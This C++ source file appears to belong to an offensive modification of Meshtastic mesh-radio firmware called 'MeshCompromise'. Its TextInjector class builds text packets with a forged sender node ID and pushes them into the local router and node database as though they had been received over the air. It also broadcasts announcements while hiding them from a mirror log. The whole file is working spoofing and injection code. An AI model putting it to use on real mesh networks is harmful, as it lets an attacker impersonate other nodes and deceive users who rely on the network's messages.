#include "meshcompromise/text_injector.h"

#include "NodeDB.h"
#include "configuration.h"
#include "mesh/MeshService.h"
#include "mesh/Router.h"
#include "meshcompromise/injected_text.h"

namespace meshcompromise
{

meshtastic_MeshPacket *TextInjector::build(uint32_t fromNode, uint32_t toNode, const char *text, size_t length)
{
    if (router == nullptr || service == nullptr) {
        LOG_WARN("MeshCompromise cannot inject, router=%p service=%p", static_cast<void *>(router),
                 static_cast<void *>(service));
        return nullptr;
    }

    meshtastic_MeshPacket *packet = router->allocForSending();
    if (packet == nullptr) {
        LOG_WARN("MeshCompromise could not allocate a Meshtastic packet");
        return nullptr;
    }

    if (!buildInjectedText(*packet, toNode, 0, text, length)) {
        LOG_WARN("MeshCompromise could not build an injected text of %u bytes", static_cast<unsigned>(length));
        packetPool.release(packet);
        return nullptr;
    }

    packet->hop_start = packet->hop_limit;

    if (fromNode != 0)
        packet->from = fromNode;

    return packet;
}

bool TextInjector::dispatch(meshtastic_MeshPacket *packet)
{
    LOG_INFO("MeshCompromise injected text id=0x%x from=0x%x to=0x%x len=%u", packet->id, packet->from, packet->to,
             static_cast<unsigned>(packet->decoded.payload.size));
    service->sendToMesh(packet, RX_SRC_LOCAL, true);
    return true;
}

bool TextInjector::dispatchAsReceived(meshtastic_MeshPacket *packet)
{
    LOG_INFO("MeshCompromise injected text id=0x%x from=0x%x to=0x%x len=%u", packet->id, packet->from, packet->to,
             static_cast<unsigned>(packet->decoded.payload.size));

    stampRxTime(packet);
    nodeDB->updateFrom(*packet);

    router->enqueueReceivedMessage(packet);
    return true;
}

bool TextInjector::inject(uint32_t fromNode, uint32_t toNode, const char *text, size_t length)
{
    meshtastic_MeshPacket *packet = build(fromNode, toNode, text, length);
    if (packet == nullptr)
        return false;

    mirror_.noteInjected(packet->id);
    return dispatchAsReceived(packet);
}

bool TextInjector::announce(const char *text, size_t length)
{
    meshtastic_MeshPacket *packet = build(0, NODENUM_BROADCAST, text, length);
    if (packet == nullptr)
        return false;

    mirror_.suppress(packet->id);
    return dispatch(packet);
}

} // namespace meshcompromise
